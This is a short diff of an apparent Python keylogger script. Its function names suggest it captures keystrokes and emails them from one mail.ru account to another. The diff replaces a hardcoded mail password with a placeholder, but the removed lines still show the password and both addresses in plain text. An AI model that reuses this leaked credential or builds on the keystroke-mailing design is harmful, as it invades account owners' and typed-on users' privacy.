@@ -30,7 +30,7 @@ def connect_smtp(messages: list, from_ad, to_ad, mypass):
 def MailSender(ready, buff_rus, buff_eng):
     fromaddr = "9662061@mail.ru"
     toaddr = "vladmorozov2020@mail.ru"
-    mypass = "qKKA8pUQm3FJCY0ViEv2"
+    mypass = "your mail api password here"
     while True:
         if ready.value:
             text_rus = create_message(fromaddr, toaddr, " ".join(buff_rus))
@@ -86,7 +86,7 @@ def KeyListener(buff_rus, buff_eng):
 
 def ImapListener(ready):
     fromaddr = "9662061@mail.ru"
-    mypass = "qKKA8pUQm3FJCY0ViEv2"
+    mypass = "your mail api password here"
     connected = False
     imap = None
 
